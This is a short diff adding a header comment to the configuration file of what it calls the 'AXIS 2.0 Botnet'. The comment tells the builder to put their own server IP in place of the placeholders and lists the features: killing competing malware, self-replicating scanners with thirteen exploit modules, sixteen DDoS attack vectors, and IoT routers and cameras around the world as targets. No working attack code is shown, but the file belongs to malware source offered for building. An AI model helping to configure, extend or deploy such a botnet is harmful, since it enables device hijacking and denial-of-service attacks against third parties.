@@ -1,5 +1,16 @@
 /*
  * AXIS 2.0 Botnet - Unified Configuration Header
+ * ============================================================================
+ * CRITICAL: Change all 0.0.0.0 placeholders to your server IP before building!
+ * 
+ * Features:
+ * - KILLER: Anti-malware killer (eliminates competing botnets)
+ * - SELFREP: Self-replication scanners (13 exploit modules)
+ * - WATCHDOG: Hardware watchdog maintenance
+ * 
+ * Attack Methods: 16 optimized L4/L7 DDoS vectors
+ * Scanner Targets: Global IoT devices, routers, cameras
+ * ============================================================================
  */
 
 #ifndef _CONFIG_H
